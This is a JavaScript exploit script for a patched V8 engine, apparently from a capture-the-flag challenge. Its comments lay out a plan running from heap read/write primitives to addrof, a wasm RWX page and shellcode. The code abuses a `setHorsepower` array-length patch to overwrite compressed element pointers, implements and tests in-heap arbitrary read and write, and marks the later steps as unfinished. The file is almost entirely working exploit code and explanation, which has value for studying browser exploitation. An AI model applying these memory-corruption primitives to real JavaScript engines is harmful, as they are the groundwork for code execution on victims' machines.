// Game plan:
// [X] 1: read_in_heap and write_in_heap (Through JSArray of floats)
// []  2: addrof (Change float arr to obj arr)
// []  3: Set up an ArrayBuffer to point to a wasm RWX page
// []  4: Shellcode (See shellcode.js)

/*
    The patch gives us the ability to change the length of a JSArray
    Reading past the end (At least for the 2 float arrays we use in this file) we can read the
    fields for the JSArray struct (Instead of the data elements).
    Doing this, we can read the pointer to the elements. It looks like this in memory:
    [8_byte_value?, value1, value2, some_jsarray_8_byte_field, elements_data_ptr]
    ^                              ^                                |
    |                              |                                |
    |                              JSArray struct                   |
    -----------------------------------------------------------------
    Accessing arr[0] seems to access (elements_data_ptr + 8_bytes) (So value1 in the diagram)
    We can read arr[3] to read the elements_data_ptr. From it, we can add the length and find the address of the JSArray
    From that, we can offset the 8 byte field and get the address of the elements data pointer

    We can write to arr[3] to overwrite the elements ptr, and then read/write to arr[0] to read/write 64bit values.
    Remember that arr is an array of floats, so whatever 64bit value we read/write will be encoded as a float.
    We use itof and ftoi to convert to/from BigInt 64bit integers

    The approach we use to get arbitrary read/writes is create 2 float arrays A and B.
    We make A point to the element ptr of the B, and then we just write the address to A[0] and then read/write B[0]

    A detail I have not mentioned yet is that `elements_data_ptr` in the diagram is not the 64bit pointer.
    The pointer is stored only in the low 32bits of the 64bit value
    It is also offset by 1 byte. That pointer is actually a byte offset into the v8 heap (Henceforth "isolate root" as it is
    called in code). So we do not actually have arbitrary read/writes, we can only read/write in addresses above the isolate root ptr
*/

// Will modify it's element ptr so tmp_b[0] modifies tmp_c's element ptr
var tmp_b = [1.3, 1.4];
// Used for read writes with tmp_c[0]
var tmp_c = [1.5, 1.6];

// Utils, ftoi, itof, print hex
var buf = new ArrayBuffer(8);
// Views of buf for type punning
var f64_buf = new Float64Array(buf);
var u32_buf = new Uint32Array(buf);
function ftoi(val) {
  f64_buf[0] = val;
  return BigInt(u32_buf[0]) + (BigInt(u32_buf[1]) << 32n);
}
// low 32 bits of number/float value in the low 32 bits of BigInt output
function ftoi_low32(val) {
  f64_buf[0] = val;
  return BigInt(u32_buf[0]);
}
// high 32 bits of number/float value in the low 32 bits of BigInt output
function ftoi_hi32(val) {
  f64_buf[0] = val;
  return BigInt(u32_buf[1]);
}
function itof(val) {
  u32_buf[0] = Number(val & 0xffffffffn);
  u32_buf[1] = Number(val >> 32n);
  return f64_buf[0];
}
function print_hex(int) {
  console.log("0x" + int.toString(16).padStart(16, "0"));
}
function print_fptr(number) {
  print_hex(ftoi(number));
}
// Preserves high 32 bits
function compress_ptr(old_val, low_32bits_to_set) {
  return itof((ftoi_hi32(old_val) << 32n) + low_32bits_to_set);
}
// Preserves high 32 bits and applies the read offset used by JSArrays in reverse (-8 bytes)
function compress_elementptr(old_val, low_32bits_to_set) {
  // No idea why the -8n is needed (It's a 64bit/8byte offset). Length of the array stored before the elements?
  return compress_ptr(old_val, low_32bits_to_set - 8n);
}
// Setup write/read in heap
tmp_b.setHorsepower(4);
tmp_c.setHorsepower(4);
var b_elementptr = ftoi_low32(tmp_b[3]);
var c_elementptr = ftoi_low32(tmp_c[3]);
// 8 bytes offset, 2 8 byte floats = 24 bytes
var b_base_addr = b_elementptr + 24n;
var c_base_addr = c_elementptr + 24n;
// 8 byte offset (compressed map ptr?)
var b_elementptr_addr = b_base_addr + 8n;
var c_elementptr_addr = c_base_addr + 8n;

// Write the pointer to the low 32 bits of the second 64bits of the tmp_b array, which is the compressed element pointer
// It should now point to tmp_c's elementptr's address (With a -8 bytes offset), so we can modify where tmp_c starts by modifying tmp_b[0]
// and read/write tmp_c[0] at that address
tmp_b[3] = compress_elementptr(tmp_b[3], c_elementptr_addr);
function read_in_heap(addr) {
  // Write the pointer to the tmp_c array elementptr with the 8 byte offset
  tmp_b[0] = compress_elementptr(tmp_b[0], addr);
  return tmp_c[0];
}
function write_in_heap(addr, value) {
  // Write the pointer to the tmp_c array elementptr with the 8 byte offset
  tmp_b[0] = compress_elementptr(tmp_b[0], addr);
  tmp_c[0] = value;
}

// Used for a test at the end
var test_arr = [1.1, 1.2];
test_arr.setHorsepower(4);
var elementptr = ftoi_low32(test_arr[3]);

console.log("test_arr[0]:");
console.log(test_arr[0]);

console.log("read_in_heap elementptr+8: (Should be first element 1.1)");
console.log(read_in_heap(elementptr + 8n));
print_fptr(read_in_heap(elementptr + 8n));

console.log("write_in_heap(elementptr + 8n, 13.37)");
write_in_heap(elementptr + 8n, 13.37);

console.log("read_in_heap elementptr+8: (Should now be 13.37)");
console.log(read_in_heap(elementptr + 8n));
print_fptr(read_in_heap(elementptr + 8n));

console.log("test_arr[0]: (Should now be 13.37)");
console.log(test_arr[0]);

while (true) {}
